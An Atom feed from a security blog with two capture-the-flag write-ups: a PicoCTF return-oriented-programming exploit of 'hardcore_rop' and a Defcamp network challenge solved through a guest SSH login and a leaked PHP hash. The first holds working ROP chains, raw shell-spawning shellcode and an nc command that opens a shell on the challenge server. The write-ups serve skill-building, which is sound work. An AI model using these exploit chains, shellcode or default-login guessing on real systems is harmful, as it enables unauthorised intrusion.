<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Shell | staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/blog/categories/shell/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2014-12-02T22:07:47+01:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[PicoCTF - Hardcore ROP]]></title>
    <link href="http://barrebas.github.io/blog/2014/11/06/picoctf-hardcore-rop/"/>
    <updated>2014-11-06T23:48:56+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/11/06/picoctf-hardcore-rop</id>
    <content type="html"><![CDATA[<p>Our team, <a href="https://ctf-team.vulnhub.com">vulnhub-ctf</a>, joined <code>picoctf</code> to improve our skills and learn a thing or two. There were many challenges, among which a few &ldquo;Master Challenges&rdquo; worth 200 points. This is a story of how we tackled <code>hardcore_rop</code>. The challenge promises ASLR, NX, PIE and what-have-you, so let&rsquo;s get cracking!</p>

<!--more-->


<p>Upon inspecting the source of code of this weird program, we see the following:</p>

<pre><code class="c">void randop() {
    munmap((void*)0x0F000000, MAPLEN);
    void *buf = mmap((void*)0x0F000000, MAPLEN, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
    unsigned seed;
    if(read(0, &amp;seed, 4) != 4) return;
    srand(seed);
    for(int i = 0; i &lt; MAPLEN - 4; i+=3) {
        *(int *)&amp;((char*)buf)[i] = rand();
        if(i%66 == 0) ((char*)buf)[i] = 0xc3;
    }
    mprotect(buf, MAPLEN, PROT_READ|PROT_EXEC);
    puts("ROP time!");
    fflush(stdout);
    size_t x, count = 0;
    do x = read(0, ((char*)&amp;seed)+count, 555-count);
    while(x &gt; 0 &amp;&amp; (count += x) &lt; 555 &amp;&amp; ((char*)&amp;seed)[count-1] != '\n');
}

int main(int argc, char *argv[]) {
    struct stat st;
    if(argc != 2 || chdir(argv[1]) != 0 || stat("./flag", &amp;st) != 0) {
        puts("oops, problem set up wrong D:");
        fflush(stdout);
        return 1;
    } else {
        puts("yo, what's up?");
        alarm(30); sleep(1);
        randop();
        fflush(stdout);
        return 0;
    }
}
</code></pre>

<p>The <code>randop()</code> function is interesting, because it does two things. Firstly, this bit builds random ROP gadgets:</p>

<pre><code class="c">    munmap((void*)0x0F000000, MAPLEN);
    void *buf = mmap((void*)0x0F000000, MAPLEN, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
    unsigned seed;
    if(read(0, &amp;seed, 4) != 4) return;
    srand(seed);
    for(int i = 0; i &lt; MAPLEN - 4; i+=3) {
        *(int *)&amp;((char*)buf)[i] = rand();
        if(i%66 == 0) ((char*)buf)[i] = 0xc3;  
    }
    mprotect(buf, MAPLEN, PROT_READ|PROT_EXEC);
</code></pre>

<p>The memory region containing the random ROP gadgets is set to executable. However, we control the seed value, so we can &ldquo;choose&rdquo; which gadgets are generated. Secondly, this function causes a buffer overflow thanks to the following code:</p>

<pre><code class="c">    size_t x, count = 0;
    do x = read(0, ((char*)&amp;seed)+count, 555-count);
    while(x &gt; 0 &amp;&amp; (count += x) &lt; 555 &amp;&amp; ((char*)&amp;seed)[count-1] != '\n');
</code></pre>

<p>This function starts to overwrite the stack up to the point were the saved return address is. Very nice! First, let&rsquo;s enable coredumps and get control of EIP.</p>

<pre><code class="bash">bas@tritonal:~/tmp/picoctf/hardcorrop$ (echo 7777; python -c 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"') | ./hardcore_rop `pwd`
yo, what's up?
ROP time!
Segmentation fault (core dumped)
bas@tritonal:~/tmp/picoctf/hardcorrop$ gdb hardcore_rop core
GNU gdb (GDB) 7.4.1-debian
...
Core was generated by `./hardcore_rop /home/bas/tmp/picoctf/hardcorrop'.
Program terminated with signal 11, Segmentation fault.
#0  0x42424242 in ?? ()
</code></pre>

<p>Excellent! After we send a seed value (7777), we supply a buffer that overwrites the saved return address on the stack. But we cannot just put our shellcode on the stack and execute it, because of NX. We can&rsquo;t write into the region at <code>0xf000000</code> because it isn&rsquo;t writeable. Furthermore, most of the address are randomized due to PIE and ALSR. Only the ROP gadgets at <code>0xf000000</code> are always at the same location. We need to find enough ROP gadgets to make the region at <code>0xf000000</code> writeable, so that we can store shellcode there and execute it.</p>

<p>For this to work, we need two things: control over registers and an <code>int 0x80</code> instruction, to execute syscalls. The region at <code>0xf000000</code> contains 40960 bytes, filled with random ROP gadgets. There could be an <code>int 0x80; ret;</code> in there. The chances are slim, but there&rsquo;s a chance nonetheless. I scripted the search for ROP gadgets with the following:</p>

<pre><code class="bash">#!/bin/bash

while read i; do
    (echo $i; echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB") | ./hardcore_rop `pwd`
    dd if=core of=region bs=1 skip=4096 count=40960
    xxd -c 1 region | awk {'print $1 $2'} |sort -r &gt; dump.txt
    python ./ropgadget.py -i bleh -d 10 &gt; $i-gadgets.txt

    cat $i-gadgets.txt |egrep 'int 0x80'
    rm core
    rm dump.txt
done &lt; digits.txt
</code></pre>

<p>This script does the following: it runs the program and sends a seed value for the ROP gadget generation. Then, it crashes the program. From the coredump, it extracts the region at <code>0xf000000</code> and proceeds to dump all these bytes into a textfile. Finally, my custom <a href="https://gist.github.com/barrebas/4fc86eaf0e9b124813a3">ropgadget.py</a> searcher extracts all the ROP gadgets. It is slightly modified to work with this setup. I let this script run for a few hours. After a while, I ran</p>

<pre><code class="bash">bas@tritonal:~/tmp/picoctf/hardcorrop$ grep "int 0x80" *
0347-gadgets.txt:RET: 0x0000d64: int 0x80; lahf; ret; 
</code></pre>

<p>It found an <code>int 0x80</code> gadget! Luckily, the opcode <code>lahf</code> is harmless: it just load the FLAGS into <code>ah</code>. No big deal! With this useable gadget, a ROP chain could be built that calls <code>mprotect</code> to set the region at <code>0xf000000</code> to writeable. After this stage 1, a second stage would read the shellcode. First things first, let&rsquo;s find gadgets that allow us to control registers. The easiest would be a <code>pop r32; ret</code>. Luckily, these sequences are very likely to occur. I found everything I needed in the list of gadgets:</p>

<pre><code># RET: 0x000913f: pop eax; ret;
# RET: 0x0003c7e: pop ecx; ret;
# RET: 0x0002393: pop edx; ret;
# RET: 0x000964d: pop ebx; ret;
# RET: 0x0000d64: int 0x80; lahf; ret;
</code></pre>

<p>I wrote the following ROP chain:</p>

<pre><code class="python">#!/usr/bin/python

import struct

BASE = 0xf000000
# RET: 0x000913f: pop eax; ret;
popeax = 0x000913f
# RET: 0x0003c7e: pop ecx; ret;
popecx = 0x0003c7e
# RET: 0x0002393: pop edx; ret;
popedx = 0x0002393
# RET: 0x000964d: pop ebx; ret;
popebx = 0x000964d
# RET: 0x0000569: pop edi; ret;
popedi = 0x0000569
# RET: 0x0000d64: int 0x80; lahf; ret;
int80h = 0x0000d64
# RET: 0x0001b11: int3; ret;
int03h = 0x0001b11

def p(x):
    return struct.pack("&lt;L", x)

payload = ""

# seed value
payload += "0347\n"

# overflow buffer
payload += "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

# syscall number 125 in eax (mprotect)
payload += p(BASE + popeax)
payload += p(125)

# pointer to memory region in ebx
payload += p(BASE + popebx)
payload += p(BASE)

# memory flags PROT_READ | PROT_WRITE | PROT_EXEC
payload += p(BASE + popedx)
payload += p(7)

# length in ecx, needs to be multiple of 2
payload += p(BASE + popecx)
payload += p(0x1000)

# call syscall int 0x80
payload += p(BASE + int80h)

# stage2 test
# edi = 0xf000000
payload += p(BASE + popedi)
payload += p(BASE)
# edx = 0xcccccccc (four times int 0x3)
payload += p(BASE + popedx)
payload += p(0xcccccccc)
# RET: 0x0002770: mov [edi], dh; ret
payload += p(BASE + 0x0002770)
# return to 0xf000000, which should contain an int 0x3
payload += p(BASE + popedx + 1)
payload += p(BASE)

print payload
## Usage: $ python ropsploit.py | ./hardcore_rop `pwd`
</code></pre>

<p>After running this first POC, the binary indeed crashed with a SIGTRAP error! Inspection of the core dump with <code>gdb</code> showed that the first byte of <code>0xf000000</code> was a <code>0xcc</code>, so this worked!</p>

<p>Writing the shellcode one byte at a time seemed tedious. Furthermore, the ROP chain has a maximum of 555 bytes, so a more flexible way was to use <code>syscall_read</code>. This will allow us to read in arbitrary shellcode. All the necessary gadgets were present:</p>

<pre><code class="python">#!/usr/bin/python

import time, struct

BASE = 0xf000000
popeax = 0x000913f
popecx = 0x0003c7e
popedx = 0x0002393
popebx = 0x000964d
popedi = 0x0000569
int80h = 0x0000d64
int03h = 0x0001b11

def p(x):
    return struct.pack("&lt;L", x)

payload = ""

# seed value
payload += "0347\n"

# overflow buffer
payload += "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

# eax = syscall_mprotect
payload += p(BASE + popeax)
payload += p(125)
# pointer to memory region in ebx
payload += p(BASE + popebx)
payload += p(BASE)
# memory flags PROT_READ | PROT_WRITE | PROT_EXEC
payload += p(BASE + popedx)
payload += p(7)
# length in ecx, needs to be multiple of 2
payload += p(BASE + popecx)
payload += p(0x1000)
# call syscall int 0x80
payload += p(BASE + int80h)

# eax = syscall_read
payload += p(BASE + popeax)
payload += p(3)
# ecx = ptr to BASE
payload += p(BASE + popecx)
payload += p(BASE)
# ebx = fd = stdin
payload += p(BASE + popebx)
payload += p(0)
# edx = size of shellcode (set to 100)
payload += p(BASE + popedx)
payload += p(100)
# call syscall int 0x80
payload += p(BASE + int80h)

# return to 0xf000000
payload += p(BASE + popedx + 1)
payload += p(BASE)

print payload
time.sleep(3)
</code></pre>

<p>Now, this was used with <a href="http://shell-storm.org/shellcode/files/shellcode-547.php">a slightly modified shellcode</a>. This shellcode uses <code>execve</code> to run <code>/bin/ash</code>; I changed it to run <code>/bin//sh</code>. The shellcode has to be supplied seperately on the command line; I could not get the exploit to work if the shellcode was printed from <code>ropsploit.py</code>. The following landed us a shell on the remote server (again, using <code>cat</code> to keep the shell alive):</p>

<pre><code class="bash">bas@tritonal:~/tmp/picoctf/hardcorrop$ (python ropsploit.py; python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'; cat) | nc vuln2014.picoctf.com 4000
yo, what's up?
ROP time!
ls -al
total 24
drwxr-xr-x    2 root     root          4096 Oct 28 17:55 .
drwxr-xr-x    3 root     root          4096 Oct  5 17:33 ..
-rw-r--r--    1 root     root            21 Oct  5 17:44 flag
-rwxr-xr-x    1 root     root         11266 Oct  6 01:13 hardcore_rop
cat flag
hard_as_PIE_amirite?
</code></pre>

<p>And there&rsquo;s the flag! A very fun challenge!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Defcamp CTF: Network 100]]></title>
    <link href="http://barrebas.github.io/blog/2014/10/31/defcamp-ctf-network-100/"/>
    <updated>2014-10-31T15:08:24+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/10/31/defcamp-ctf-network-100</id>
    <content type="html"><![CDATA[<p>For this challenge, we&rsquo;re given the following clue:</p>

<p><code>My manager lives at 10.13.37.21. Any guest is always welcome. But he has a secret. Can you find it out?</code></p>

<p>A secret? Let&rsquo;s dig in!</p>

<!--more-->


<p>I did a simple nmap scan of that box:</p>

<pre><code class="bash">Starting Nmap 6.00 ( http://nmap.org ) at 2014-10-18 13:08 CEST
Nmap scan report for 10.13.37.21
Host is up (0.024s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</code></pre>

<p>The webpage has a login form, but I didn&rsquo;t have any credentials. The clue did say guests are always welcome, but <code>guest:guest</code> didn&rsquo;t work. However, these credentials <em>did</em> work for <code>ssh</code>! So I landed a shell on the box:</p>

<pre><code class="bash">Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-37-generic x86_64)

 * Documentation:  https://help.ubuntu.com/
Last login: Sat Oct 18 00:05:47 2014 from 10.13.37.1
guest@n1:~$ ls
toolkit
guest@n1:~$ ls -alh
total 32K
drwxr-xr-x 4 guest guest 4.0K Oct 18 00:06 .
drwxr-xr-x 4 root  root  4.0K Oct 17 01:40 ..
-rw------- 1 guest guest    0 Oct 18 00:06 .bash_history
-rw-r--r-- 1 guest guest  220 Oct 17 01:40 .bash_logout
-rw-r--r-- 1 guest guest 3.6K Oct 17 01:40 .bashrc
drwx------ 2 guest guest 4.0K Oct 17 01:42 .cache
-rw-r--r-- 1 guest guest  675 Oct 17 01:40 .profile
drwxr-xr-t 2 root  root  4.0K Oct 17 01:41 toolkit
-rw------- 1 guest guest  777 Oct 18 00:06 .viminfo
</code></pre>

<p>For some reason, we could use <code>tcpdump</code> to look at incoming traffic:</p>

<pre><code class="bash">guest@n1:~/toolkit$ ./tcpdump
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
11:13:03.921683 IP n1.ssh &gt; 10.13.37.1.52543: Flags [P.], seq 1154997930:1154998122, ack 2969808471, win 349, options [nop,nop,TS val 10598245 ecr 188495], length 192
11:13:03.934082 IP 10.13.37.1.52543 &gt; n1.ssh: Flags [.], ack 192, win 661, options [nop,nop,TS val 188517 ecr 10598245], length 0
11:13:03.975864 IP 10.13.37.1.37658 &gt; n1.41730: Flags [S], seq 2811437647, win 1024, options [mss 1369], length 0
11:13:03.975882 IP n1.41730 &gt; 10.13.37.1.37658: Flags [R.], seq 0, ack 2811437648, win 0, length 0
11:13:03.987686 IP 10.13.37.1.43518 &gt; n1.41511: Flags [S], seq 4021855713, win 1024, options [mss 1369], length 0
11:13:03.987704 IP n1.41511 &gt; 10.13.37.1.43518: Flags [R.], seq 0, ack 402185571
</code></pre>

<p>But we&rsquo;re looking for a flag! I wanted to see what made the login page tick.</p>

<pre><code class="bash">guest@n1:~/toolkit$ cat /var/www/html/index.php 
&lt;?php

error_reporting(0);
ini_set('display_errors', 0);

if(isset($_POST['pass']) &amp;&amp; strlen($_POST['pass']) &lt; 12) {
    echo 'Validation failed: The password field too short.'; die();
}

if(isset($_POST['user'])) {
  if($_POST['user'] == 'manager' &amp;&amp; md5($_POST['pass']) == 'e701a78ce9d38201e9fc17737be0996d') {
    echo 'The secret is behind &lt;strong&gt;0f388689dc4728cfde0de9a1ee47c8d3&lt;/strong&gt;. Don\'t tell anyone!';
  } else {
    echo 'Wrong username or password.';
  }
  die();
}

?&gt;
&lt;!DOCTYPE html&gt;
...snip...
</code></pre>

<p>Apparently, the flag is &lsquo;behind&rsquo; <code>0f388689dc4728cfde0de9a1ee47c8d3</code>. This md5 hash decrypts to <code>ididyourmom</code>, which is also the flag. What a nasty secret this manager has!</p>
]]></content>
  </entry>
  
</feed>
